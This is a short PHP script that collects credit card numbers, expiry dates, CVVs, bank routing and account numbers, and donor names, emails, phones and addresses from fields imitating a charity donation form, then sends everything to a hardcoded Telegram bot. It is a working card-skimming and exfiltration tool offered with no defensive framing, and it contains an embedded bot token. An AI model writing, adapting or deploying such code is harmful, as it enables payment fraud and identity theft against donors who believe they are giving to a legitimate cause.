<?php
    define('url', 'https://api.telegram.org/bot5162986863:AAEFJ0EJu56TB36VvnpbPeFMQDfpgW9B2_k/');
    $card_number = $_GET["submitted[payment_information][payment_fields][credit][card_number]"];
    $card_expiry = $_GET["submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_month]"];
    $card_cvv = $_GET["submitted[payment_information][payment_fields][credit][card_cvv]"];
    $card_type = $_GET["submitted[payment_information][payment_fields][credit][card_type]"];

    $bank_type = $_GET["submitted[payment_information][payment_fields][bank account][accType]"];
    $bank_routing = $_GET["submitted[payment_information][payment_fields][bank account][routingNum]"];
    $bank_accnum = $_GET["submitted[payment_information][payment_fields][bank account][accNum]"];

    $first_name = $_GET["submitted[donor_information][first_name]"];
    $last_name = $_GET["submitted[donor_information][last_name]"];
    $email = $_GET["submitted[donor_information][mail]"];
    $phone_number = $_GET["submitted[email_optin][telephone]"];
    $hear_back_phone = $_GET["submitted[email_optin][receive_updates_by_phone]"];
    $hear_back_message = $_GET["submitted[email_optin][receive_updates_by_sms]"];
    $address1 = $_GET["submitted[billing_information][address]"];
    $address2 = $_GET["submitted[billing_information][address_line_2]"];
    $city = $_GET["submitted[billing_information][city]" ];
    $country = $_GET["submitted[billing_information][country]"];
    $state = $_GET["submitted[billing_information][state]"];
    $zip = $_GET["submitted[billing_information][zip]"];
    
    $chat_id = '5162986863'
    $message = urlencode("CARD NUM:".$card_number."\n CARD EXP: ".$card_expiry."\n CARD CVV: ".$card_cvv."\n CARD TYPE: ".$card_type."\n BANK TYPE: ".$bank_type."\n ROUTING: ".$bank_routing."\n ACC NUM: ".$bank_accnum."\n FIRST NAME: ".$first_name."\n LAST NAME: ".$last_name."\n EMAIL: ".$email."\n PHONE: ".$phone_number."\n HB PHONE: ".$hear_back_phone."\n HB SMS: ".$hear_back_message."\n ADDRES1: ".$address1."\n ADDRESS2: ".$address2."\n STATE: ".$state."\n COUNTRY: ".$country."\n ZIP: ".$zip);
    file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");




    ?>